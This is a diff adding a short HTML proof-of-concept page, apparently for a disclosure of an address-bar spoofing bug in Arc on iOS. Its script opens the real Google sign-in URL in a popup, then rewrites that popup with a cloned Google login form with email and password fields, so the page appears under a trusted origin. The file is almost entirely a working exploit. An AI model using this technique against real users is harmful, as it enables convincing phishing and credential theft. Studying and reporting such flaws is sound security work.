@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Arc iOS — Missing Origin Indicator</title>
+<style>
+body{font-family:-apple-system,sans-serif;max-width:480px;margin:0 auto;padding:24px 16px;background:#fff;color:#1d1d1f}
+h2{font-size:18px;margin-bottom:8px}
+p{font-size:14px;color:#666;line-height:1.5;margin-bottom:20px}
+button{display:block;width:100%;padding:16px;background:#007aff;color:#fff;border:none;border-radius:12px;font-size:17px;font-weight:600;cursor:pointer;margin-bottom:12px}
+button:active{opacity:.7}
+</style>
+</head>
+<body>
+<h2>Arc iOS — Missing Origin Indicator</h2>
+<p>Tap the button below, then check the address bar in the popup that opens.</p>
+<button onclick="run()">Click me</button>
+<script>
+function run(){
+  var a=document.createElement('a');
+  a.href='https://accounts.google.com/signin/v2/identifier?flowName=GlifWebSignIn';
+  a.target='poc';
+  a.style.display='none';
+  document.body.appendChild(a);
+  a.click();
+  a.remove();
+  setTimeout(function(){
+    var w=window.open('','poc');
+    if(!w)return;
+    w.document.open();
+    w.document.write('<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>Sign in - Google Accounts</title></head><body style="font-family:-apple-system,sans-serif;background:#fff;margin:0"><div style="max-width:380px;margin:0 auto;padding:40px 24px;text-align:center"><div style="font-size:24px;margin-bottom:4px"><span style="color:#4285f4">G</span><span style="color:#ea4335">o</span><span style="color:#fbbc05">o</span><span style="color:#4285f4">g</span><span style="color:#34a853">l</span><span style="color:#ea4335">e</span></div><h1 style="font-size:22px;font-weight:400;color:#202124;margin:10px 0 4px">Sign in</h1><p style="color:#5f6368;font-size:14px;margin-bottom:20px">to continue to your account</p><input placeholder="Email or phone" style="width:100%;padding:14px;border:1px solid #dadce0;border-radius:6px;font-size:16px;margin:6px 0;-webkit-appearance:none"><input type="password" placeholder="Password" style="width:100%;padding:14px;border:1px solid #dadce0;border-radius:6px;font-size:16px;margin:6px 0;-webkit-appearance:none"><div style="display:flex;justify-content:space-between;align-items:center;margin-top:20px"><a href="#" style="color:#1a73e8;text-decoration:none;font-size:14px">Create account</a><button style="background:#1a73e8;color:#fff;border:none;padding:10px 24px;border-radius:6px;font-size:14px;font-weight:500">Next</button></div></div></body></html>');
+    w.document.close();
+    w.stop();
+  },50);
+}
+</script>
+</body>
+</html>
